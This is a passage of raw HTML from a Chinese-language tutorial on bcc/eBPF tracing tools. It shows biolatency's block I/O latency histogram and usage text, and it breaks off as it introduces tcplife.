class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n# /usr/share/bcc/tools/biolatency\r\nTracing block device I/O... Hit Ctrl-C to end.\r\n^C\r\n     usecs               : count     distribution\r\n         0 -&gt; 1          : 0        |                                        |\r\n         2 -&gt; 3          : 0        |                                        |\r\n         4 -&gt; 7          : 0        |                                        |\r\n         8 -&gt; 15         : 0        |                                        |\r\n        16 -&gt; 31         : 0        |                                        |\r\n        32 -&gt; 63         : 1        |                                        |\r\n        64 -&gt; 127        : 63       |****                                    |\r\n       128 -&gt; 255        : 121      |*********                               |\r\n       256 -&gt; 511        : 483      |************************************    |\r\n       512 -&gt; 1023       : 532      |****************************************|\r\n      1024 -&gt; 2047       : 117      |********                                |\r\n      2048 -&gt; 4095       : 8        |                                        |\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a634c1d5cbed230877010-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634c1d5cbed230877010-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a634c1d5cbed230877010-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634c1d5cbed230877010-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a634c1d5cbed230877010-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634c1d5cbed230877010-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a634c1d5cbed230877010-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634c1d5cbed230877010-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a634c1d5cbed230877010-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634c1d5cbed230877010-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5a634c1d5cbed230877010-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634c1d5cbed230877010-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5a634c1d5cbed230877010-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634c1d5cbed230877010-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5a634c1d5cbed230877010-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634c1d5cbed230877010-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5a634c1d5cbed230877010-17\">17</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a634c1d5cbed230877010-1\"><span class=\"crayon-p\"># /usr/share/bcc/tools/biolatency</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634c1d5cbed230877010-2\"><span class=\"crayon-e\">Tracing </span><span class=\"crayon-e\">block </span><span class=\"crayon-i\">device</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">I</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">O</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Hit </span><span class=\"crayon-v\">Ctrl</span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">C</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">to</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">end</span><span class=\"crayon-sy\">.</span></div><div class=\"crayon-line\" id=\"crayon-5a634c1d5cbed230877010-3\"><span class=\"crayon-o\">^</span><span class=\"crayon-i\">C</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634c1d5cbed230877010-4\"><span class=\"crayon-h\">     </span><span class=\"crayon-v\">usecs</span><span class=\"crayon-h\">               </span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">count     </span><span class=\"crayon-i\">distribution</span></div><div class=\"crayon-line\" id=\"crayon-5a634c1d5cbed230877010-5\"><span class=\"crayon-h\">         </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\">          </span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\">        </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\">                                        </span><span class=\"crayon-o\">|</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634c1d5cbed230877010-6\"><span class=\"crayon-h\">         </span><span class=\"crayon-cn\">2</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">3</span><span class=\"crayon-h\">          </span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\">        </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\">                                        </span><span class=\"crayon-o\">|</span></div><div class=\"crayon-line\" id=\"crayon-5a634c1d5cbed230877010-7\"><span class=\"crayon-h\">         </span><span class=\"crayon-cn\">4</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">7</span><span class=\"crayon-h\">          </span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\">        </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\">                                        </span><span class=\"crayon-o\">|</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634c1d5cbed230877010-8\"><span class=\"crayon-h\">         </span><span class=\"crayon-cn\">8</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">15</span><span class=\"crayon-h\">         </span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\">        </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\">                                        </span><span class=\"crayon-o\">|</span></div><div class=\"crayon-line\" id=\"crayon-5a634c1d5cbed230877010-9\"><span class=\"crayon-h\">        </span><span class=\"crayon-cn\">16</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">31</span><span class=\"crayon-h\">         </span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\">        </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\">                                        </span><span class=\"crayon-o\">|</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634c1d5cbed230877010-10\"><span class=\"crayon-h\">        </span><span class=\"crayon-cn\">32</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">63</span><span class=\"crayon-h\">         </span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\">        </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\">                                        </span><span class=\"crayon-o\">|</span></div><div class=\"crayon-line\" id=\"crayon-5a634c1d5cbed230877010-11\"><span class=\"crayon-h\">        </span><span class=\"crayon-cn\">64</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">127</span><span class=\"crayon-h\">        </span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">63</span><span class=\"crayon-h\">       </span><span class=\"crayon-o\">|</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-h\">                                    </span><span class=\"crayon-o\">|</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634c1d5cbed230877010-12\"><span class=\"crayon-h\">       </span><span class=\"crayon-cn\">128</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">255</span><span class=\"crayon-h\">        </span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">121</span><span class=\"crayon-h\">      </span><span class=\"crayon-o\">|</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-h\">                               </span><span class=\"crayon-o\">|</span></div><div class=\"crayon-line\" id=\"crayon-5a634c1d5cbed230877010-13\"><span class=\"crayon-h\">       </span><span class=\"crayon-cn\">256</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">511</span><span class=\"crayon-h\">        </span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">483</span><span class=\"crayon-h\">      </span><span class=\"crayon-o\">|</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-h\">    </span><span class=\"crayon-o\">|</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634c1d5cbed230877010-14\"><span class=\"crayon-h\">       </span><span class=\"crayon-cn\">512</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1023</span><span class=\"crayon-h\">       </span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">532</span><span class=\"crayon-h\">      </span><span class=\"crayon-o\">|</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">|</span></div><div class=\"crayon-line\" id=\"crayon-5a634c1d5cbed230877010-15\"><span class=\"crayon-h\">      </span><span class=\"crayon-cn\">1024</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2047</span><span class=\"crayon-h\">       </span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">117</span><span class=\"crayon-h\">      </span><span class=\"crayon-o\">|</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-h\">                                </span><span class=\"crayon-o\">|</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634c1d5cbed230877010-16\"><span class=\"crayon-h\">      </span><span class=\"crayon-cn\">2048</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">4095</span><span class=\"crayon-h\">       </span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">8</span><span class=\"crayon-h\">        </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\">                                        </span><span class=\"crayon-o\">|</span></div><div class=\"crayon-line\" id=\"crayon-5a634c1d5cbed230877010-17\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0057 seconds] -->\r\n<p>这是另一个有用的工具和例子；它使用一个名为 maps 的 BPF 特性，它可以用来实现高效的内核摘要统计。从内核层到用户层的数据传输仅仅是“计数”列。 用户级程序生成其余的。</p>\n<p>值得注意的是，这种工具大多支持 CLI 选项和参数，如其使用信息所示：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a634c1d5cbf1047051118\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n# /usr/share/bcc/tools/biolatency -h\r\nusage: biolatency [-h] [-T] [-Q] [-m] [-D] [interval] [count]\r\n\r\nSummarize block device I/O latency as a histogram\r\n\r\npositional arguments:\r\n  interval            output interval, in seconds\r\n  count               number of outputs\r\n\r\noptional arguments:\r\n  -h, --help          show this help message and exit\r\n  -T, --timestamp     include timestamp on output\r\n  -Q, --queued        include OS queued time in I/O time\r\n  -m, --milliseconds  millisecond histogram\r\n  -D, --disks         print a histogram per disk device\r\n\r\nexamples:\r\n    ./biolatency            # summarize block I/O latency as a histogram\r\n    ./biolatency 1 10       # print 1 second summaries, 10 times\r\n    ./biolatency -mT 1      # 1s summaries, milliseconds, and timestamps\r\n    ./biolatency -Q         # include OS queued time in I/O time\r\n    ./biolatency -D         # show each disk device separately\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a634c1d5cbf1047051118-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634c1d5cbf1047051118-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a634c1d5cbf1047051118-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634c1d5cbf1047051118-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a634c1d5cbf1047051118-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634c1d5cbf1047051118-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a634c1d5cbf1047051118-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634c1d5cbf1047051118-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a634c1d5cbf1047051118-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634c1d5cbf1047051118-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5a634c1d5cbf1047051118-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634c1d5cbf1047051118-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5a634c1d5cbf1047051118-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634c1d5cbf1047051118-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5a634c1d5cbf1047051118-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634c1d5cbf1047051118-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5a634c1d5cbf1047051118-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634c1d5cbf1047051118-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5a634c1d5cbf1047051118-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634c1d5cbf1047051118-20\">20</div><div class=\"crayon-num\" data-line=\"crayon-5a634c1d5cbf1047051118-21\">21</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634c1d5cbf1047051118-22\">22</div><div class=\"crayon-num\" data-line=\"crayon-5a634c1d5cbf1047051118-23\">23</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a634c1d5cbf1047051118-1\"><span class=\"crayon-p\"># /usr/share/bcc/tools/biolatency -h</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634c1d5cbf1047051118-2\"><span class=\"crayon-v\">usage</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">biolatency</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">h</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">T</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">Q</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">m</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">D</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">interval</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">count</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line\" id=\"crayon-5a634c1d5cbf1047051118-3\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634c1d5cbf1047051118-4\"><span class=\"crayon-e\">Summarize </span><span class=\"crayon-e\">block </span><span class=\"crayon-i\">device</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">I</span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">O</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">latency </span><span class=\"crayon-st\">as</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">a</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">histogram</span></div><div class=\"crayon-line\" id=\"crayon-5a634c1d5cbf1047051118-5\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634c1d5cbf1047051118-6\"><span class=\"crayon-e\">positional </span><span class=\"crayon-v\">arguments</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line\" id=\"crayon-5a634c1d5cbf1047051118-7\"><span class=\"crayon-h\">  </span><span class=\"crayon-e\">interval            </span><span class=\"crayon-e\">output </span><span class=\"crayon-v\">interval</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">in</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">seconds</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634c1d5cbf1047051118-8\"><span class=\"crayon-e\">  </span><span class=\"crayon-e\">count               </span><span class=\"crayon-e\">number </span><span class=\"crayon-e\">of </span><span class=\"crayon-e\">outputs</span></div><div class=\"crayon-line\" id=\"crayon-5a634c1d5cbf1047051118-9\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634c1d5cbf1047051118-10\"><span class=\"crayon-e\">optional </span><span class=\"crayon-v\">arguments</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line\" id=\"crayon-5a634c1d5cbf1047051118-11\"><span class=\"crayon-h\">  </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">h</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-e\">help          </span><span class=\"crayon-e\">show </span><span class=\"crayon-r\">this</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">help </span><span class=\"crayon-e\">message </span><span class=\"crayon-st\">and</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">exit</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634c1d5cbf1047051118-12\"><span class=\"crayon-h\">  </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">T</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-e\">timestamp     </span><span class=\"crayon-e\">include </span><span class=\"crayon-e\">timestamp </span><span class=\"crayon-e\">on </span><span class=\"crayon-v\">output</span></div><div class=\"crayon-line\" id=\"crayon-5a634c1d5cbf1047051118-13\"><span class=\"crayon-h\">  </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">Q</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-e\">queued        </span><span class=\"crayon-e\">include </span><span class=\"crayon-e\">OS </span><span class=\"crayon-e\">queued </span><span class=\"crayon-e\">time </span><span class=\"crayon-st\">in</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">I</span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">O</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">time</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634c1d5cbf1047051118-14\"><span class=\"crayon-h\">  </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">m</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-e\">milliseconds  </span><span class=\"crayon-e\">millisecond </span><span class=\"crayon-v\">histogram</span></div><div class=\"crayon-line\" id=\"crayon-5a634c1d5cbf1047051118-15\"><span class=\"crayon-h\">  </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">D</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-e\">disks         </span><span class=\"crayon-i\">print</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">a</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">histogram </span><span class=\"crayon-e\">per </span><span class=\"crayon-e\">disk </span><span class=\"crayon-e\">device</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634c1d5cbf1047051118-16\"> </div><div class=\"crayon-line\" id=\"crayon-5a634c1d5cbf1047051118-17\"><span class=\"crayon-v\">examples</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634c1d5cbf1047051118-18\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">.</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">biolatency</span><span class=\"crayon-h\">            </span><span class=\"crayon-p\"># summarize block I/O latency as a histogram</span></div><div class=\"crayon-line\" id=\"crayon-5a634c1d5cbf1047051118-19\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">.</span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">biolatency</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">10</span><span class=\"crayon-h\">       </span><span class=\"crayon-p\"># print 1 second summaries, 10 times</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634c1d5cbf1047051118-20\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">.</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">biolatency</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">mT</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\">      </span><span class=\"crayon-p\"># 1s summaries, milliseconds, and timestamps</span></div><div class=\"crayon-line\" id=\"crayon-5a634c1d5cbf1047051118-21\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">.</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">biolatency</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">Q</span><span class=\"crayon-h\">         </span><span class=\"crayon-p\"># include OS queued time in I/O time</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634c1d5cbf1047051118-22\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">.</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">biolatency</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">D</span><span class=\"crayon-h\">         </span><span class=\"crayon-p\"># show each disk device separately</span></div><div class=\"crayon-line\" id=\"crayon-5a634c1d5cbf1047051118-23\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0041 seconds] -->\r\n<p>它们的行为就像其它 Unix 工具一样，以利于采用而设计。</p>\n<h4 id=\"toc_6\">5、 tcplife</h4>\n<p>另一个有用的工具是 <a href=\"https://github.com/iovisor/bcc/blob/master/tools/tcplife.py\">tcplife</a> ，该例显示 TCP 会话的生命周期和吞吐量统计。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a634c1d5cbf6214345708\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span 